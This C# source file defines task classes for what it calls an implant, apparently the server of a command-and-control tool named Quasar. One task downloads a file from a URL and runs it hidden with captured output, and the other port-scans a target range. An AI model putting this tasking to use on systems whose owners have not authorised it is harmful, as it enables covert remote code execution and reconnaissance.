
using Quasar.Server.RestApiConstants;
using System;
using System.Collections.Generic;

namespace Quasar.Server.Tasking
{
    public class TaskStatus
    {
        public const int STATUS_SUCCESS = 0;
        public const int STATUS_ERROR = 1;
        public const int STATUS_PENDING = 2;

        public static bool IsValidStatus(int status)
        {
            return status <= 2 && status >= 0;
        }
    }

    public class TaskType
    {
        public const int EXECUTE_PROCESS = 1; // 2-4 reserved for file transfers
        public const int PORT_SCAN = 5;

        public static bool IsValidType(int taskType)
        {
            return taskType == 1 || taskType == 5;
        }
    }

    public class BaseTaskInfo
    {
        public string TaskId { get; set; }

        public int Type { get; set; }

        public int Status { get; set; }

        public string StatusMsg { get; set; }

        public BaseTaskInfo(string taskId, int taskType)
        {
            if (String.IsNullOrEmpty(taskId))
            {
                throw new ArgumentNullException("Cannot create implant task with null or empty task ID.");
            }
            if (!TaskType.IsValidType(taskType))
            {
                throw new ArgumentException("Invalid task type " + taskType);
            }
            this.TaskId = taskId;
            this.Type = taskType;
            this.Status = TaskStatus.STATUS_PENDING;
            this.StatusMsg = "";
        }

        public virtual Dictionary<string, object> ConvertToJsonDict()
        {
            return new Dictionary<string, object>{
                [RestConstants.TASK_ID_FIELD] = TaskId,
                [RestConstants.TASK_TYPE_FIELD] = Type,
                [RestConstants.TASK_STATUS_FIELD] = Status,
                [RestConstants.TASK_STATUS_MSG_FIELD] = StatusMsg
            };
        }
    }

    /// <summary>
    /// Task information for process execution tasks
    /// </summary>
    public class ExecuteProcessTaskInfo : BaseTaskInfo
    {
        public string DownloadUrl { get; set; }

        public string FilePath { get; set; } // for file to execute

        public string DownloadDestPath { get; set; }

        public string ProcessArgs { get; set; }

        public bool UseShellExecute { get; set; }

        public bool CaptureOutput { get; set; }

        public bool NoWindow { get; set; }

        public int PID { get; set; }

        public int ExitCode { get; set; }

        public string Stdout { get; set; }

        public string Stderr { get; set; }

        public ExecuteProcessTaskInfo(
            string taskId, 
            string filepath, 
            string downloadUrl,
            string downloadDest="", 
            string processArgs="", 
            bool useShellExecute=false,
            bool captureOutput=false,
            bool noWindow=false
        ) : base(taskId, TaskType.EXECUTE_PROCESS) 
        {
            if (String.IsNullOrEmpty(downloadUrl) && String.IsNullOrEmpty(filepath))
            {
                throw new ArgumentException("Download URL and file path cannot both be null/empty for ExecuteProcessTaskInfo.");
            }
            this.DownloadUrl = downloadUrl;
            this.FilePath = filepath;
            this.DownloadDestPath = downloadDest;
            this.ProcessArgs = processArgs;
            this.UseShellExecute = useShellExecute;
            this.CaptureOutput = captureOutput;
            this.NoWindow = noWindow;
            this.PID = -1;
            this.ExitCode = -1;
            this.Stdout = "";
            this.Stderr = "";
        }

        public override Dictionary<string, object> ConvertToJsonDict()
        {
            return new Dictionary<string, object>{
                [RestConstants.TASK_ID_FIELD] = TaskId,
                [RestConstants.TASK_TYPE_FIELD] = Type,
                [RestConstants.TASK_STATUS_FIELD] = Status,
                [RestConstants.TASK_STATUS_MSG_FIELD] = StatusMsg,
                [RestConstants.BINARY_PATH_FIELD] = FilePath,
                [RestConstants.PROCESS_ARGS_FIELD] = ProcessArgs,
                [RestConstants.DOWNLOAD_URL_FIELD] = DownloadUrl,
                [RestConstants.DOWNLOAD_DEST_PATH_FIELD] = DownloadDestPath,
                [RestConstants.USE_SHELL_EXEC_FIELD] = UseShellExecute,
                [RestConstants.CAPTURE_OUTPUT_FIELD] = CaptureOutput,
                [RestConstants.NO_WINDOW_FIELD] = NoWindow,
                [RestConstants.PROCESS_PID_FIELD] = PID,
                [RestConstants.PROCESS_EXIT_CODE_FIELD] = ExitCode,
                [RestConstants.PROCESS_STDOUT_FIELD] = Stdout,
                [RestConstants.PROCESS_STDERR_FIELD] = Stderr
            };
        }
    }

    public class PortScanTaskInfo : BaseTaskInfo
    {
        public string TargetRange { get; set; }
        public int[] TargetPorts { get; set; }
        public Dictionary<string, int[]> Result { get; set; }
        
        public PortScanTaskInfo(string taskId, string targetRange, int[] targetPorts) : base (taskId, TaskType.PORT_SCAN)
        {
            this.TargetRange = targetRange;
            this.TargetPorts = targetPorts;
            this.Result = new Dictionary<string, int[]>();
        }

        public override Dictionary<string, object> ConvertToJsonDict()
        {
            return new Dictionary<string, object>
            {
                [RestConstants.TASK_ID_FIELD] = TaskId,
                [RestConstants.TASK_TYPE_FIELD] = Type,
                [RestConstants.TASK_STATUS_FIELD] = Status,
                [RestConstants.TASK_STATUS_MSG_FIELD] = StatusMsg,
                [RestConstants.PORT_SCAN_TARGET_RANGE_FIELD] = TargetRange,
                [RestConstants.PORT_SCAN_TARGET_PORTS_FIELD] = TargetPorts,
                [RestConstants.PORT_SCAN_RESULTS_FIELD] = Result
            };
        }
    }
}